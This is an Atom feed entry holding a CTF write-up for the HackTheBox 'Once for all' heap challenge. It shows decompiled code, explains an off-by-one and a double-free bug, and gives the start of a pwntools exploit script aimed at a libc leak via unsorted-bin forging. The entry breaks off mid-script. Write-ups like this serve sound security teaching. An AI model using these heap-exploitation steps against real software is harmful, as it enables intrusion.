<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-05-20T02:20:23+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/</id>
        
        <entry>
            <title type="html"><![CDATA[[HackTheBox Cyber Apocalypse 2022 - pwn] Once for all]]></title>
            <link href="https://nasm.re/posts/onceforall/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/onceforall/</id>
            
            <published>2022-05-19T00:00:00+00:00</published>
            <updated>2022-05-19T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="reverse-engineering">
        Reverse engineering
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>All the snippets of pseudo-code are issued by <a
  class="gblog-markdown__link"
  href="https://hex-rays.com/ida-free/"
  
  >IDA freeware</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_1310</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_13C8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">small_alloc</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">fix</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">examine</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
        <span class="n">savebig</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid choice!&#34;</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">small_alloc</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">nmemb</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">idx</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+8h] [rbp-18h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">allocated</span> <span class="o">==</span> <span class="mi">15</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Nothing more!&#34;</span><span class="p">);</span>
  <span class="o">++</span><span class="n">allocated</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">||</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xEuLL</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">How much space do you need for it: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nmemb</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">nmemb</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="o">||</span> <span class="n">nmemb</span> <span class="o">&gt;</span> <span class="mh">0x38</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Your inventory cannot provide this type of space!&#34;</span><span class="p">);</span>
  <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">nmemb</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">nmemb</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Something didn&#39;t work out...&#34;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input your weapon&#39;s details: &#34;</span><span class="p">);</span>
  
  <span class="cp"># off-by-one
</span><span class="cp"></span>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]],</span> <span class="n">nmemb</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
<p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xE</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ok, let&#39;s get you some new parts for this one... seems like it&#39;s broken&#34;</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">How much space do you need for this repair: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x38</span> <span class="p">)</span>
    <span class="cp"># [1] 
</span><span class="cp"></span>    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Your inventory cannot provide this type of space.&#34;</span><span class="p">);</span>
  <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
  <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Something didn&#39;t work out...&#34;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input your weapon&#39;s details: &#34;</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What would you like to do now?</span><span class="se">\n</span><span class="s">1. Verify weapon</span><span class="se">\n</span><span class="s">2. Continue</span><span class="se">\n</span><span class="s">&gt;&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">verified</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_1648</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]);</span>
      <span class="n">verified</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
<p>We can print a chunk only one time:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">examine</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">examined</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_14D0</span><span class="p">);</span>
  <span class="n">examined</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Choose an index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xE</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">alloc_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]);</span>
  <span class="k">else</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">savebig</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">chungus_weapon</span> <span class="o">||</span> <span class="n">qword_202068</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_16E8</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How much space do you need for this massive weapon: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x5AFu</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0xF5C0u</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Adding to your inventory..&#34;</span><span class="p">);</span>
      <span class="n">chungus_weapon</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
      <span class="n">qword_202068</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] This is not possible..&#34;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>An off-by-one when we create a new chunk</li>
<li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
<li>Trivial read after free thanks to the double free.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="restrictions">
        Restrictions
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#restrictions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Restrictions" href="#restrictions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>The program does not use <code>printf</code> with a format specifer, then we cannot do a <a
  class="gblog-markdown__link"
  href="https://maxwelldulin.com/BlogPost?post=3107454976"
  
  >House of husk</a
>.</li>
<li>We can only allocate <code>15</code> chunks.</li>
<li>All the allocations except the big one are made using <code>calloc</code>, even if it can be easily bypassed by adding the <code>IS_MAPPED</code> flag to the chunk header to avoid zero-ing.</li>
<li>The libc version (<code>2.27</code>) mitigates a few techniques, especially the <a
  class="gblog-markdown__link"
  href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/"
  
  >House of Orange</a
> and introduces the <code>tcache</code>.</li>
<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="how-to-leak-libc-">
        How to leak libc ?
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#how-to-leak-libc-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor How to leak libc ?" href="#how-to-leak-libc-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for it: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">hang</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your weapon&#39;s details: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">freexalloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for this repair: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">if</span> <span class="n">doubleFree</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your weapon&#39;s details: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">allochuge</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for this massive weapon: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1"># get libc leak</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">55</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span> <span class="c1"># size</span>
<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mi">39</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span> <span class="c1"># barrier</span>

<span class="c1"># freexalloc(5, 560, b&#34;&#34;, doubleFree=True)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
